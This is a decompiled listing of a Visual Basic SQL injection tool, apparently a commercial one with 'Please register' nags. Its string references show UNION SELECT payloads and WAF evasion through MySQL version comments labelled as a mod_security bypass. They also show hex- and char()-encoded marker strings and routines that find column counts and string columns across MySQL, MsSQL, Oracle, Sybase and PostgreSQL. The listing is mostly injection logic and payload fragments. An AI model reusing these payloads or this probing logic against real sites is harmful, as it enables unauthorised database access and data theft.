'N  * ref: __vbaStrCat
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: LCase(
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaAryUnlock
'N  * ref: ":*"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarLikeVar
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaAryUnlock
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaExitProc
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_153()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "union all select "
'N  * ref: "/*!30000union all select "
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaStrCat
'N  * ref: ","
'N  * ref: __vbaStrCat
'N  * ref: __vbaFreeStr
'N  * ref: IIf(
'N  * ref: ","
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "*/"
'N  * ref: __vbaStrCat
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_154()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "union all select "
'N  * ref: "/*!30000union all select "
'N  * ref: IIf(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarCat
'N  * ref: "0x31303235343830303536"
'N  * ref: "concat(0x7e,0x27,0x7233646D3076335F73716C5F696E6A656374696F6E,0x27,0x7e)"
'N  * ref: IIf(
'N  * ref: ","
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: "*/"
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_155()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "999999.9"
'N  * ref: IIf(
'N  * ref: __vbaVarCat
'N  * ref: " "
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarDup
'N  * ref: "where"
'N  * ref: "and"
'N  * ref: IIf(
'N  * ref: "("
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "--"
'N  * ref: " "
'N  * ref: "x"
'N  * ref: "="
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_156()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "0x7233646D3076335F73716C5F696E6A656374696F6E"
'N  * ref: "concat(0x7e,0x27,0x7233646D3076335F73716C5F696E6A656374696F6E,0x27,0x7e)"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStrVar
'N  * ref: ","
'N  * ref: __vbaVarSub
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstLe
'N  * ref: LCase(
'N  * ref: "select "
'N  * ref: __vbaVarAdd
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarCopy
'N  * ref: " "
'N  * ref: ";"
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: ","
'N  * ref: __vbaStrVarVal
'N  * ref: InstrRev(
'N  * ref: __vbaVarAdd
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLenVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarCopy
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaFreeVar
'N  * ref: " "
'N  * ref: "-"
'N  * ref: ";"
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaFreeVar
'N  * ref: ","
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVar
'N  * ref: ","
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaFreeVar
'N  * ref: ","
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_157()
'N  * ref: __vbaExceptHandler
'N  * ref: "Oracle error based"
'N  * ref: __vbaStrCmp
'N  * ref: "PostgreSQL"
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrMove
'N  * ref: "MySQL*"
'N  * ref: __vbaStrLike
'N  * ref: __vbaStrCmp
'N  * ref: "Finding columns count(MySQL)"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "1025480056"
'N  * ref: __vbaInStr
'N  * ref: __vbaUI1I2
'N  * ref: __vbaVarForInit
'N  * ref: "Finding columns count(MySQL,MsSQL 2005): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "999999.9"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: Subr_154
'N  * ref: "--"
'N  * ref: __vbaVarDup
'N  * ref: " and "
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: "1025480056"
'N  * ref: __vbaInStr
'N  * ref: "~'r3dm0v3_sql_injection'~"
'N  * ref: __vbaInStr
'N  * ref: " "
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "403"
'N  * ref: "406"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: "Please register to enable mod_security bypass"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: "Turning on mod_security bypass"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaI2Var
'N  * ref: "Selected Column Count is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForInit
'N  * ref: "Trying again to find columns count for string type using comment(MySQL,MsSQL 2005): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "999999.9"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: Subr_154
'N  * ref: "-- a"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: "1025480056"
'N  * ref: __vbaInStr
'N  * ref: "~'r3dm0v3_sql_injection'~"
'N  * ref: __vbaInStr
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: "Selected Column Count is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Injection type is String (')"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarForInit
'N  * ref: "Trying again to find columns count with string type(MySQL,MsSQL 2005): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "999999.9"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: Subr_154
'N  * ref: "--"
'N  * ref: __vbaVarDup
'N  * ref: " and "
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: "1025480056"
'N  * ref: __vbaInStr
'N  * ref: "~'r3dm0v3_sql_injection'~"
'N  * ref: __vbaInStr
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: "Selected Column Count is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Injection type is String (')"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCopy
'N  * ref: Subr_153
'N  * ref: "--"
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: " "
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: __vbaStrCmp
'N  * ref: "Trying another method using keyword for finding columns count"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Finding columns count(General)"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForInit
'N  * ref: "Finding columns count(MySQL,MsSQL 2005): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCopy
'N  * ref: Subr_153
'N  * ref: "--"
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStr
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: "Selected Column Count is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: ")"
'N  * ref: __vbaStrCopy
'N  * ref: "Changing inejction syntax"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Another try fo finding columns count(MySQL,MsSQL 2005)"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForInit
'N  * ref: "Finding columns count(MySQL): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "999999.9"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: Subr_154
'N  * ref: " from mysql.help_topic where "
'N  * ref: __vbaVarDup
'N  * ref: "("
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "1=1"
'N  * ref: __vbaVarDup
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: "1025480056"
'N  * ref: __vbaInStr
'N  * ref: "~'r3dm0v3_sql_injection'~"
'N  * ref: __vbaInStr
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: "Selected Column Count is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: LCase(
'N  * ref: " It seems that DB server is not MySQL"
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarDup
'N  * ref: "mysql*"
'N  * ref: __vbaVarLikeVar
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "Findig columns count for MySQL failed!"
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Inejction syntax changed to default"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "MySQL*"
'N  * ref: __vbaStrLike
'N  * ref: __vbaExitProc
'N  * ref: "MySQL*"
'N  * ref: __vbaStrLike
'N  * ref: "Findig columns count for MySQL failed!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: "Findig columns count for MySQL failed! It seems that DB server is not MySQL"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Oracle"
'N  * ref: __vbaStrCmp
'N  * ref: "Trying Oracle error based method"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_716
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: "Oracle error based"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaExitProc
'N  * ref: "Can not use Oracle error based method"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Finding columns count(Oracle)"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForInit
'N  * ref: "Finding columns count(Oracle): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCopy
'N  * ref: Subr_153
'N  * ref: " from dual where "
'N  * ref: "1=1"
'N  * ref: __vbaVarDup
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStr
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: __vbaStrCmp
'N  * ref: "Oracle"
'N  * ref: __vbaStrCopy
'N  * ref: "Selected Column Count is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: ")"
'N  * ref: __vbaStrCopy
'N  * ref: "Changing inejction syntax"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Another try fo finding columns count(Oracle)"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForInit
'N  * ref: "Finding columns count(Oracle): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCopy
'N  * ref: Subr_153
'N  * ref: " from dual where "
'N  * ref: __vbaVarDup
'N  * ref: "("
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: " 1=1"
'N  * ref: __vbaVarDup
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStr
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: __vbaStrCmp
'N  * ref: "Oracle"
'N  * ref: __vbaStrCopy
'N  * ref: "Selected Column Count is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: "Findig columns count for Oracle failed! It seems db server is not Oracle"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Inejction syntax changed to default"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Findig columns count for Oracle failed! It seems db server is not Oracle"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCopy
'N  * ref: Subr_153
'N  * ref: "--"
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: " "
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: __vbaStrCmp
'N  * ref: "Finding columns count(General)"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForInit
'N  * ref: "Finding columns count(General): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCopy
'N  * ref: Subr_153
'N  * ref: "--"
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "x"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStr
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: "Selected Column Count is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaOnError
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: "PostgreSQL"
'N  * ref: __vbaVarForInit
'N  * ref: __vbaStrCat
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "Finding columns count and string column("
'N  * ref: "): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForInit
'N  * ref: "Finding columns count and string column("
'N  * ref: "): "
'N  * ref: ","
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: "char(114)||char(51)||char(100)%2bchar(109)%2bchar(48)%2bchar(118)%2bchar(51)%2bchar(95)%2bchar(115)%2bchar(113)%2bchar(108)%2bchar(95)%2bchar(105)%2bchar(110)%2bchar(106)%2bchar(101)%2bchar(99)%2bchar(116)%2bchar(105)%2bchar(111)%2bchar(110)"
'N  * ref: "chr(114)||chr(51)||chr(100)||chr(109)||chr(48)||chr(118)||chr(51)||chr(95)||chr(115)||chr(113)||chr(108)||chr(95)||chr(105)||chr(110)||chr(106)||chr(101)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110)"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: Subr_153
'N  * ref: "--"
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: "x"
'N  * ref: "="
'N  * ref: "x"
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: "r3dm0v3_sql_injection"
'N  * ref: __vbaInStr
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: __vbaI2Var
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: "%String_Col%"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_153
'N  * ref: "--"
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: "x"
'N  * ref: "="
'N  * ref: "x"
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "Selected Column Count is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Valid String Column is "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: "Cannot find column count!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: __vbaExitProc
'N  * ref: "Finding string column"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: "MySQL,MsSQL no error,Sybase (ASE),PostgreSQL,Oracle,unknown"
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarCopy
'N  * ref: __vbaStrCmp
'N  * ref: ","
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeStr
'N  * ref: ","
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: "Tying to find string column for "
'N  * ref: Subr_143
'N  * ref: "MySQL*"
'N  * ref: __vbaVarLikeVar
'N  * ref: __vbaBoolVarNull
'N  * ref: "(select concat(0x7e,0x27,0x7233646D3076335F68766A5F696E6A656374696F6E,0x27,0x7e) limit 0,1)"
'N  * ref: __vbaStrCopy
'N  * ref: "~'r3dm0v3_hvj_injection'~"
'N  * ref: "MsSQL*"
'N  * ref: __vbaVarLikeVar
'N  * ref: __vbaBoolVarNull
'N  * ref: "(select cast(Char(114)%2bChar(51)%2bChar(100)%2bChar(109)%2bChar(48)%2bChar(118)%2bChar(51)%2bChar(95)%2bChar(104)%2bChar(118)%2bChar(106)%2bChar(95)%2bChar(105)%2bChar(110)%2bChar(106)%2bChar(101)%2bChar(99)%2bChar(116)%2bChar(105)%2bChar(111)%2bChar(110) as nvarchar(4000)))"
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaVarTstEq
'N  * ref: "(select Char(114)||Char(51)||Char(100)%2bChar(109)%2bChar(48)%2bChar(118)%2bChar(51)%2bChar(95)%2bChar(104)%2bChar(118)%2bChar(106)%2bChar(95)%2bChar(105)%2bChar(110)%2bChar(106)%2bChar(101)%2bChar(99)%2bChar(116)%2bChar(105)%2bChar(111)%2bChar(110))"
'N  * ref: "Oracle"
'N  * ref: __vbaVarTstEq
'N  * ref: "chr(114)||chr(51)||chr(100)||chr(109)||chr(48)||chr(118)||chr(51)||chr(95)||chr(104)||chr(118)||chr(106)||chr(95)||chr(105)||chr(110)||chr(106)||chr(101)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110)"
'N  * ref: "PostgreSQL"
'N  * ref: __vbaVarTstEq
'N  * ref: "(select chr(114)||chr(51)||chr(100)||chr(109)||chr(48)||chr(118)||chr(51)||chr(95)||chr(104)||chr(118)||chr(106)||chr(95)||chr(105)||chr(110)||chr(106)||chr(101)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110) limit 1 offset 0)"
'N  * ref: "'r3dm0v3_hvj_injection'"
'N  * ref: __vbaStrCopy
'N  * ref: "r3dm0v3_hvj_injection"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: LCase(
'N  * ref: __vbaVarTstEq
'N  * ref: "999999.9"
'N  * ref: __vbaLenBstr
'N  * ref: Mid(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarForInit
'N  * ref: "Finding string column: "
'N  * ref: Subr_143
'N  * ref: Subr_156
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: LCase(
'N  * ref: LCase(
'N  * ref: Subr_166
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: "Valid String Column is "
'N  * ref: Subr_143
'N  * ref: "%String_Col%"
'N  * ref: __vbaVarDup
'N  * ref: Subr_156
